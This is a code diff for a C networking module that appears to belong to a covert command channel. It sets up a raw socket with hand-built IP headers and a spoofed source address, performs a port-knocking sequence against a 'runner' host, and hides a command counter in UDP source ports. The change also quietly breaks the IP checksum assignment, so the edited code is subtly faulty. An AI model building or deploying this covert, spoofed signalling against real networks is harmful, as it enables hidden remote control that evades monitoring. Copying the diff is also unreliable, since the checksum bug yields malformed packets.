@@ -1,19 +1,12 @@
 #include "network.h"
 
 #include <arpa/inet.h>
-#include <errno.h>
 #include <linux/filter.h>
-#include <linux/socket.h>
 #include <linux/if_ether.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
-#include <stdint.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <sys/socket.h>
-#include <sys/time.h>
-#include <time.h>
 #include <unistd.h>
 
 
@@ -29,14 +22,14 @@
 #define IP_HDR_TOS 0
 #define IP_HDR_TTL 64
 
-int setup_covert_fd() {
-    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+int setup_covert_fd(void) {
+    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (fd == -1) {
         fprintf(stderr, "covert socket() failed\n");
         return -1;
     }
 
-    int one = 1;
+    const int one = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
         fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
         return -1;
@@ -71,10 +64,9 @@ int setup_covert_fd() {
     return fd;
 }
 
-int perform_knock(struct Context *ctx) {
+int perform_knock(const struct Context *ctx) {
     const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
+    struct sockaddr_in dest = {0};
     dest.sin_family = AF_INET;
     if (inet_pton(AF_INET, ctx->runner_ip, &dest.sin_addr) != 1) {
         perror("inet_pton");
@@ -82,7 +74,7 @@ int perform_knock(struct Context *ctx) {
     }
 
     for (int i = 0; i < KNOCKS; i++) {
-        int fd = socket(AF_INET, SOCK_STREAM, 0);
+        const int fd = socket(AF_INET, SOCK_STREAM, 0);
         if (fd == -1) {
             perror("socket");
             return -1;
@@ -123,34 +115,38 @@ unsigned short checksum(void *b, int len) {
 int send_packet(struct Context *ctx, const char *ip_src_addr) {
     uint16_t *udp_src_port = &ctx->cmd_seq_num;
 
-    uint8_t packet[PKT_MAX_LEN];
+    uint8_t packet[PKT_MAX_LEN] = {0};
 
     struct iphdr *ip = (struct iphdr *)packet;
+    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
+    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
+    const uint16_t payload_size = rand_payload(ctx, payload);
+    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+
     ip->ihl = IP_IHL;
     ip->version = IP_VERSION;
     ip->tos = IP_HDR_TOS;
-    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
-    ip->id = htons((uint16_t)rand());
+    ip->tot_len = htons(pkt_len);
+    ip->id = htons(rand_u16(ctx));
     ip->frag_off = IP_FRAG_OFF;
     ip->ttl = IP_HDR_TTL;
     ip->protocol = IPPROTO_UDP;
     ip->saddr = inet_addr(ip_src_addr);
     ip->daddr = inet_addr(ctx->runner_ip);
-    ip->check = checksum(ip, sizeof(struct iphdr));
-    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
+    checksum(ip, ip->ihl * 4);
+
     udp->source = htons(*udp_src_port);
     udp->dest = htons(COVERT_CHAN);
-    udp->len = htons(sizeof(struct udphdr));
+    udp->len = htons(sizeof(struct udphdr) + payload_size);
     udp->check = 0;
 
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
+    struct sockaddr_in dest = {0};
     dest.sin_family = AF_INET;
     dest.sin_port = udp->dest;
     dest.sin_addr.s_addr = ip->daddr;
 
-    sendto(ctx->covert_fd, packet, sizeof(struct iphdr)+sizeof(struct udphdr), 0, (struct sockaddr *)&dest, sizeof(dest));
-    (*udp_src_port)++;
+    sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
+    (ctx->cmd_seq_num)++;
 
     return 0;
 }
